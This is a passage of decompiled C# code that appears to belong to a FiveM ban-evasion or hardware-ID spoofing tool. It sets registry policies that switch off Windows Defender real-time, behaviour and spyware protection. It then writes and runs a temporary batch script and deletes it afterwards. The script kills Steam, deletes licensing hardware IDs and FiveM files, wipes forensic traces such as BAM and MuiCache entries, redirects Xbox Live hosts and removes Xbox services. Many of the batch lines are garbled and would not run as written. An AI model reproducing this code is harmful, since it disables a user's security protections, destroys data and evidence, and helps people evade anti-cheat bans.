      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", (object) 1);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", (object) "1", RegistryValueKind.DWord);
      try
      {
        if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
        {
          System.IO.File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
          System.IO.File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
        }
        if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
        {
          Directory.Delete("C:\\Program Files (x86)\\Blade Group");
          Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
        }
        new Class1().spoofUserMode();
      }
      catch
      {
      }
      string str = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
      using (StreamWriter streamWriter = new StreamWriter(str))
      {
        streamWriter.WriteLine("echo off");
        streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
        streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
        streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc Saturn_202253");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
        streamWriter.WriteLine(":folderclean");
        streamWriter.WriteLine("call :getDiscordVersion");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("goto :xboxclean");
        streamWriter.WriteLine(": getDiscordVersion");
        streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
        streamWriter.WriteLine("     set 'varLoc =%%a'");
        streamWriter.WriteLine("   goto :d1");
        streamWriter.WriteLine(")");
        streamWriter.WriteLine(":d1");
        streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
        streamWriter.WriteLine("     set 'discordVersion =%%z'");
        streamWriter.WriteLine(")");
        streamWriter.WriteLine("goto :EOF");
        streamWriter.WriteLine(": xboxclean");
        streamWriter.WriteLine(" cls");
        streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
        streamWriter.WriteLine("sc stop XblAuthManager");
        streamWriter.WriteLine("sc stop XblGameSave");
        streamWriter.WriteLine("sc stop XboxNetApiSvc");
        streamWriter.WriteLine("sc stop XboxGipSvc");
        streamWriter.WriteLine("sc delete XblAuthManager");
        streamWriter.WriteLine("sc delete XblGameSave");
        streamWriter.WriteLine("sc delete XboxNetApiSvc");
        streamWriter.WriteLine("sc delete XboxGipSvc");
        streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
        streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
        streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
        streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
        streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
        streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
        streamWriter.WriteLine("exit");
        streamWriter.WriteLine("goto :eof");
      }
      Process.Start(str).WaitForExit();
      System.IO.File.Delete(str);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", (object) "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", (object) "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", (object) "1");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", (object) "2000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "2000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 1, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", (object) 6, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", (object) 0, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", (object) "Medium", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "0", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "400");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "400");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "5000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 14, RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", (object) "0", RegistryValueKind.DWord);
